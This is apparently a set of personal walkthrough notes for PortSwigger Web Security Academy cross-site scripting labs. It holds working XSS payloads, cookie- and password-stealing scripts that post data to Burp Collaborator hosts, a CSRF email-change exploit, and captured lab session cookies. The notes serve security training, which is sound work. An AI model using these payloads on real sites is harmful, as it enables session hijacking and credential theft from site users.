# Cross-site scripting (XSS)

### Lab: Reflected XSS into HTML context with nothing encoded

<script>alert('hello')</script>

### Lab: Reflected XSS into HTML context with nothing encoded

<script>alert('hello')</script>

### Lab: DOM XSS in document.write sink using source location.search

```
function trackSearch(query) {
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
    trackSearch(query);
}
```

"><svg onload=alert(1)>

### Lab: DOM XSS in innerHTML sink using source location.search

```
<script>
    function doSearchQuery(query) {
        document.getElementById('searchMessage').innerHTML = query;
    }
    var query = (new URLSearchParams(window.location.search)).get('search');
    if(query) {
        doSearchQuery(query);
    }
</script>
```
  
<img src=1 onerror=alert(1)>
    
```
<script>
    $(function() {
        $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
    });
</script>
```

https://0ace00060457dc2dc1419fa300c1006f.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)//

    
```
$(window).on('hashchange', function(){
    var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
    if (post) post.get(0).scrollIntoView();
});
```
    
<iframe src="https://0a8d00c703f5b286c079059a004f00d5.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
    
https://stackoverflow.com/questions/72537989/is-location-hash-vulnerable-to-dom-xss-in-jquery-selector-when-combined-with-oth

https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array/slice

### Lab: Reflected XSS into attribute with angle brackets HTML-encoded
    
can be anything here, then hover over input to trigger xss "onmouseover="alert(1)
    
### Lab: Stored XSS into anchor href attribute with double quotes HTML-encoded

javascript:alert(1)
    
### Lab: Reflected XSS into a JavaScript string with angle brackets HTML encoded
    
```
<script>
    var searchTerms = 'asdasdasd';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

'; alert(1); var can_be_anything = '
    
var searchTerms = '';
    
var searchTerms = ''; alert(1); var can_be_anything = '';

https://security.stackexchange.com/questions/66252/encodeuricomponent-in-a-unquoted-html-attribute

### Lab: DOM XSS in document.write sink using source location.search inside a select element

```
var stores = ["London","Paris","Milan"];
var store = (new URLSearchParams(window.location.search)).get('storeId');
document.write('<select name="storeId">');
if(store) {
    document.write('<option selected>'+store+'</option>');
}
for(var i=0;i<stores.length;i++) {
    if(stores[i] === store) {
        continue;
    }
    document.write('<option>'+stores[i]+'</option>');
}
document.write('</select>');
```

</script><script>alert('xss');</script><script>/*

https://security.stackexchange.com/questions/112069/break-out-of-javascript-data-context-to-perform-xss-when-backslash-and-quotes-ar
    
### Lab: DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded

`ng-app` gives it away that it is an angularjs application
    
{{constructor.constructor('alert(1)')()}}

{{$on.constructor('alert(1)')()}}

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md
    
### Lab: Reflected DOM XSS
    
<script src='resources/js/searchResults.js'></script>
<script>search('search-results')</script>
    
https://0a2600570393199ac0b03375001500fc.web-security-academy.net/resources/js/searchResults.js
    
function search(path) {
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
            eval('var searchResultsObj = ' + this.responseText);
            displaySearchResults(searchResultsObj);
        }
    };
    xhr.open("GET", path + window.location.search);
    xhr.send();

    function displaySearchResults(searchResultsObj) {
        var blogHeader = document.getElementsByClassName("blog-header")[0];
        var blogList = document.getElementsByClassName("blog-list")[0];
        var searchTerm = searchResultsObj.searchTerm
        var searchResults = searchResultsObj.results

        var h1 = document.createElement("h1");
        h1.innerText = searchResults.length + " search results for '" + searchTerm + "'";
        blogHeader.appendChild(h1);
        var hr = document.createElement("hr");
        blogHeader.appendChild(hr)

        for (var i = 0; i < searchResults.length; ++i)
        {
            var searchResult = searchResults[i];
            if (searchResult.id) {
                var blogLink = document.createElement("a");
                blogLink.setAttribute("href", "/post?postId=" + searchResult.id);

                if (searchResult.headerImage) {
                    var headerImage = document.createElement("img");
                    headerImage.setAttribute("src", "/image/" + searchResult.headerImage);
                    blogLink.appendChild(headerImage);
                }

                blogList.appendChild(blogLink);
            }

            blogList.innerHTML += "<br/>";

            if (searchResult.title) {
                var title = document.createElement("h2");
                title.innerText = searchResult.title;
                blogList.appendChild(title);
            }

            if (searchResult.summary) {
                var summary = document.createElement("p");
                summary.innerText = searchResult.summary;
                blogList.appendChild(summary);
            }

            if (searchResult.id) {
                var viewPostButton = document.createElement("a");
                viewPostButton.setAttribute("class", "button is-small");
                viewPostButton.setAttribute("href", "/post?postId=" + searchResult.id);
                viewPostButton.innerText = "View post";
            }
        }

        var linkback = document.createElement("div");
        linkback.setAttribute("class", "is-linkback");
        var backToBlog = document.createElement("a");
        backToBlog.setAttribute("href", "/");
        backToBlog.innerText = "Back to Blog";
        linkback.appendChild(backToBlog);
        blogList.appendChild(linkback);
    }
}

https://portswigger.net/web-security/dom-based
                                                 
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html#escaping-javascript-escapes
                                                 
makes a request to /search-results?search=$QUERY and obtains the responseText which is a json object with the following structure:
                                                 
```
{"results":[],"searchTerm":"$QUERY"}
```
                                                 
hence eval({"results":[],"searchTerm":"$QUERY"}) will run

GET /search-results?search=asdasd"}
            
{"results":[],"searchTerm":"asdasd\"}"}
            
GET /search-results?search=asdasd\"}
            
{"results":[],"searchTerm":"asdasd\\"}"} (last 2 characters are out of object and will crash eval() function, hence need to interpret last 2 characters as comments
                                                 
https://www.w3schools.com/js/js_comments.asp

{"results":[],"searchTerm":"asdasd\\"}//"}
    
GET /search-results?search=asdasd\"};alert(123);//  
                                                 
<script src='resources/js/loadCommentsWithVulnerableEscapeHtml.js'></script>
<script>loadComments('/post/comment')</script>
    
### Lab: Stored DOM XSS

function escapeHTML(html) {
    return html.replace('<', '&lt;').replace('>', '&gt;');
}    

replace only first occurence lol.

<><img src=1 onerror=alert(1)>
    
### Lab: Exploiting cross-site scripting to steal cookies
    
author name and comment <h1>hello</h1>
    
comment is vulnerable to xss
    
author name and comment <script>alert()</script>

<script>
fetch('https://5djr73bv19nm3is4cuvw3xmzhqngb5.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body: "proof of concept"});
fetch('https://5djr73bv19nm3is4cuvw3xmzhqngb5.burpcollaborator.net', {method: 'POST', mode: 'no-cors', body: document.cookie});
</script>

secret=ldEm7IMPRZNhtTA2ZxDowFQTdrGC5Gei; session=GWMx6l5YpHDr8DGTJEsqj62IsirAkBz8

```
GET / HTTP/1.1
Host: 0a030042040f4c53c04a3a6a008d00cb.web-security-academy.net
Cookie: secret=ldEm7IMPRZNhtTA2ZxDowFQTdrGC5Gei; session=GWMx6l5YpHDr8DGTJEsqj62IsirAkBz8 # edit this
...
```

### Lab: Exploiting cross-site scripting to capture passwords    

```
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://gp903vt8a18clqz08b851wbyyp4hs6.burpcollaborator.net',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
    
```
<input name=username id=username>
<input type=password name=password id=password onchange="Capture()">

<script>
function Capture() {
var user = document.getElementById('username').value;
var pass = document.getElementById('password').value;
var xhr = new XMLHttpRequest();
xhr.open("GET", "https://zhkjvelr2k0vd9rj0u0otf3hq8w1kq.burpcollaborator.net?username=" + user + "&password=" + pass, true)
xhr.send()
}
</script>
```
    
### Lab: Exploiting XSS to perform CSRF
    
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>

```
```
### Lab: Reflected XSS into HTML context with most tags and attributes blocked
    
```
<iframe src="https://0acc0059043fe655c05b160100090066.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```

### Reflected XSS into HTML context with all tags blocked except custom ones
 
```
<script>
location = 'https://0a5f003a04d24121c109559a007d0086.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

### Reflected XSS with some SVG markup allowed

```
<svg><animatetransform onbegin=alert(1)>
```
    
### Reflected XSS in canonical link tag

https://portswigger.net/research/xss-in-hidden-input-fields

```
<link rel="canonical" href='https://0a1a002b03809233c0f126f80007009e.web-security-academy.net/'/>
```

```
https://0a1a002b03809233c0f126f80007009e.web-security-academy.net/?%27 
https://0a1a002b03809233c0f126f80007009e.web-security-academy.net/?'
<link rel="canonical" href="https://0a1a002b03809233c0f126f80007009e.web-security-academy.net/?" '>
```

```
https://0a1a002b03809233c0f126f80007009e.web-security-academy.net/?%27accesskey=%27X%27onclick=%27alert(1)%27%27
https://0a1a002b03809233c0f126f80007009e.web-security-academy.net/?'accesskey='X'onclick='alert(1)''
<link rel="canonical" href="https://0a1a002b03809233c0f126f80007009e.web-security-academy.net/?" accesskey="X" onclick="alert(1)" ''>
```

### Reflected XSS into a JavaScript string with single quote and backslash escaped

Search for something then view page source and analyse javascript. Realise that there is a vulnerable function.  

view-source:https://0a7200e604b84119c13c5e99009f009c.web-security-academy.net/?search=asd
                                                                                                                                    
```
</script><img src=1 onerror=alert(document.domain)>
```

```
<script>
    var searchTerms = 'asd';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

### Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded and single quotes escaped

Search for something then view page source and analyse javascript. Realise that there is a vulnerable function.  

view-source:https://0a7200e604b84119c13c5e99009f009c.web-security-academy.net/?search=asd

```
<script>
    var searchTerms = '';
    document.write('<img src="/resources/images/tracker.gif?searchTerms='+encodeURIComponent(searchTerms)+'">');
</script>
```

```
\';alert(document.domain)//
\%27;alert(document.domain)//
```

### Reflected XSS into a template literal with angle brackets, single, double quotes, backslash and backticks Unicode-escaped

```
<script>
    var message = `0 search results for 'asd'`;
    document.getElementById('searchMessage').innerText = message;
</script>
```
      
```
${alert(document.domain)}
```
    
### Reflected XSS protected by very strict CSP, with dangling markup attack
	
https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection
	
https://book.hacktricks.xyz/pentesting-web/content-security-policy-csp-bypass
    
/email?email=asd
    
/email?email=asd">asd
    
/email?email=asd">asd<a>click me</a>
    
/email?email=asd"><a href =https://exploit-0a31008c040bc776c0246864016300f0.exploit-server.net/exploit>click me</a><base target='
    
<base target=' sets window.name for some reason.... don't really know why

```
<script>

if(window.name) {
	new Image().src='//fk3zdi529trgk3eo429lbc2knbt5hu.burpcollaborator.net?'+encodeURIComponent(window.name);
	} else {
		window.location = "https://0a8b0083041dc78fc09f6821009300d7.web-security-academy.net/my-account?email=asd%22%3E%3Ca%20href%20=https://exploit-0a31008c040bc776c0246864016300f0.exploit-server.net/exploit%3Eclick%20me%3C/a%3E%3Cbase%20target=%27"
}
    
</script>
```

<img width="765" alt="image" src="https://user-images.githubusercontent.com/56427824/195265254-4d0a3516-781e-49d4-be5f-f0d62417d31a.png">

CSRF Token: CgwGsTEoQQvRqtp5wScRwNOn1pq5QqkS

```
<html>
    <body>
        <form action="https://0a8b0083041dc78fc09f6821009300d7.web-security-academy.net/my-account/change-email" method="POST">
            <input type="hidden" name="csrf" value="CgwGsTEoQQvRqtp5wScRwNOn1pq5QqkS" />
            <input type="hidden" name="email" value="hacker@evil-user.net" />
        </form>
        <script>
            document.forms[0].submit();
        </script>
    </body>
</html>
```

